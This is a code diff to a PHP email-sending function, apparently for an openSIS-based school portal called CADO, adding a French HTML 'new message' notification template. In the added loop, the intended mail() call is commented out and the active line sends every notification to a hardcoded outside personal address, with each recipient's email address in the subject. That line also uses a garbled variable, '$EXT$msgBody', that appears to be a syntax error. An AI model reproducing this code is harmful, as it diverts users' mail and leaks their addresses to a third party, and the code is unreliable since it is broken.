@@ -730,8 +730,69 @@ function SendMail($to, $userName, $subject, $mailBody, $attachment, $toCC, $toBC
 {
     //$mailBody = singleQuoteReplace('', '', $mailBody);
     // $mailBody = ($mailBody);
-    $mailBody = base64_encode($mailBody);
 
+    $EXTmsgBody='<!DOCTYPE html>
+    <html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Message de CADO</title>
+    </head>
+    <body style="margin: 0; padding: 0; font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f7fa; color: #333;">
+        <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
+            <!-- Header -->
+            <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 40px 30px; text-align: center;">
+                <div style="background-color: rgba(255,255,255,0.1); display: inline-block; padding: 15px 25px; border-radius: 50px; margin-bottom: 20px;">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M3 8L10.89 13.26C11.2187 13.4793 11.6049 13.5963 12 13.5963C12.3951 13.5963 12.7813 13.4793 13.11 13.26L21 8M5 19H19C19.5304 19 20.0391 18.7893 20.4142 18.4142C20.7893 18.0391 21 17.5304 21 17V7C21 6.46957 20.7893 5.96086 20.4142 5.58579C20.0391 5.21071 19.5304 5 19 5H5C4.46957 5 3.96086 5.21071 3.58579 5.58579C3.21071 5.96086 3 6.46957 3 7V17C3 17.5304 3.21071 18.0391 3.58579 18.4142C3.96086 18.7893 4.46957 19 5 19Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <h1 style="color: white; font-size: 32px; font-weight: 700; margin: 0; text-shadow: 0 2px 4px rgba(0,0,0,0.1);">Message de CADO</h1>
+            </div>
+            
+            <!-- Content -->
+            <div style="padding: 50px 40px;">
+                <div style="text-align: center; margin-bottom: 40px;">
+                    <div style="background-color: #f8f9ff; border-left: 4px solid #667eea; padding: 25px; border-radius: 8px; margin: 20px 0;">
+                        <h2 style="color: #333; font-size: 24px; font-weight: 600; margin: 0 0 15px 0;">Nouveau message reçu</h2>
+                        <p style="color: #666; font-size: 16px; line-height: 1.6; margin: 0;">
+                            Vous avez reçu un message sur le portail de CADO. Veuillez vous connecter au portail pour récupérer le message.
+                        </p>
+                    </div>
+                </div>
+                
+                <div style="text-align: center; margin: 40px 0;">
+                    <a href="https://opensis.cado.ca/" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-decoration: none; padding: 15px 35px; border-radius: 50px; font-size: 16px; font-weight: 600; display: inline-block; transition: transform 0.2s ease, box-shadow 0.2s ease; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);">
+                        Se connecter au portail
+                    </a>
+                </div>
+                
+                <div style="background-color: #f8f9ff; padding: 20px; border-radius: 8px; text-align: center; margin-top: 30px;">
+                    <p style="color: #666; font-size: 14px; margin: 0; line-height: 1.5;">
+                        <strong>Note:</strong> Ce message a été généré automatiquement. Veuillez ne pas répondre à cet email.
+                    </p>
+                </div>
+            </div>
+            
+            <!-- Footer -->
+            <div style="background-color: #f8f9ff; padding: 30px; text-align: center; border-top: 1px solid #e8ecf0;">
+                <p style="color: #888; font-size: 14px; margin: 0 0 10px 0;">
+                    © 2025 CADO Portal - Tous droits réservés
+                </p>
+                <p style="color: #aaa; font-size: 12px; margin: 0;">
+                    Système de notification automatique
+                </p>
+            </div>
+        </div>
+    </body>
+    </html>
+    ';
+    $list=explode(',', $to);
+    foreach ($list as $key => $toAddr){
+            // mail($toAddr,"Message de CADO",$EXTmsgBody);
+            mail('roger.grant@me.com',$toAddr,$EXT$msgBody);
+    }
+    $mailBody = base64_encode($mailBody);
     $subject = singleQuoteReplace('', '', $subject);
     $grpName = str_replace("'", "\'", $grpName);
     $attachment = str_replace("'", "\'", $attachment);
